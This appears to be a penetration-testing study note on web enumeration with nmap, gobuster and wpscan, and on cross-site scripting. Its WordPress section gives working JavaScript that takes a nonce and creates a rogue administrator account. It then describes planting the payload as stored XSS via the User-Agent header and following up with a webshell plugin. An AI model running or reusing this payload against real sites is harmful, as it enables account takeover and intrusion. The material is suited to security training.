
# Enumeration
Web application penetration testing is the practice of simulating attacks on a system in an attempt to gain access to sensitive data, with the purpose of determining whether a system is secure. These attacks are performed either internally or externally on a system, and they help provide information about the target system, identify vulnerabilities within them, and uncover exploits that could actually compromise the system. It is an essential health check of a system that informs testers whether remediation and security measures are needed.

With NMAP we can get the **fingerprint** of a webserver.

```shell
sudo nmap -p 443,80 --script=http-enum <target>
```

And can discover most popular directories open on the server.

You can also use **Wappalyzer** to detect the Technology Stack.
# Gobuster
This is a tool that can discover hidden path in webservers. It uses wordlist to bruteforce directories, files or can perform a **Fuzzing** / **DNS** enumeration.

```shell
gobuster dir -u <target> -w /path/to/wordlist -t 10
```

In this case Gobuster is run with 10 threads with a directory bruteforce attack on the given target. Gobuster can also bruteforce APIs path

```shell
gobuster dir -u <target> -w /path/to/wordlist -p /path/to/api-pattern
```

Where the file `/path/to/api-pattern` is something like that

```adblock
{GOBUSTER}/v1
{GOBUSTER}v2
```

Many times custom or not-standard APIs are the most vulnerable. Exploiting a login API, for example, we could log in into a web server with admin privileges.

With `-x` we can specify file extensions

```shell
gobuster dir -u <target> -w /path/to/wordlist -x php js aspx md txt jpg png
```

# Cross-Site Scripting (XSS)
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. XSS are divided in two types: **stored** that remains persistent on the webserver and **reflected** that are usually crafted to be inserted in a link and run-time executed . The most common string to test an XSS vulnerability is

```js
<script>alert(1)</script>
```
But it is also smart to test for the following character
```
< > ' " { } ;
```
In a case when our payload is stored actively on the server, for example if we inject an XSS inside the User Agent, the web administrator of the page could see the XSS (the popup) in his administration page (eg. Wordpress Panel). If the XSS is for example a redirect or some dangerous arbitrary code, many bad things can be done.

## Privilege Escalation via XSS (Wordpress)
WordPress nonces protect the platform against various malicious attacks, particularly cross-site request forgery (CSRF). This cyber attack exploits WordPress security vulnerabilities to trick users into submitting unwanted requests, from changing users’ login details to deleting user accounts. In the following way we can get a Nonce for a dynamically created user.

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

And we can create the new user with

```js
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

We can then minify the attack with something like [JSCompress](https://jscompress.com/) and ==**encode it in UTF-16**== integer with [Cyberchef](https://gchq.github.io/CyberChef/) or charCodeAt JS function. At this point we only need to find a way to inject it in the Server in a persistent way (XSS Stored). This can be done if the PHP part of the server doesn't sanitize input in the User-Agent or other parameters of the request headers. Once we got the admin access we can craft or use a WebShell plugin to enumerate and exploit the system. We can use something like [Wordpress Shell Login](https://github.com/p0dalirius/Wordpress-webshell-plugin) and can be found on [github](https://github.com/p0dalirius/Wordpress-webshell-plugin).
# Wordpress enumeration

We can enumerate WordPress pages and their plugins and themes with [wpscan](https://github.com/wpscanteam/wpscan). The following bash line will instruct wpscan to enumerate plugins in aggressive mode and print the output on a file

```shell
wpscan --url https://<TARGET> --enumerate p --plugins-detection aggressive -o dir/file.txt
```
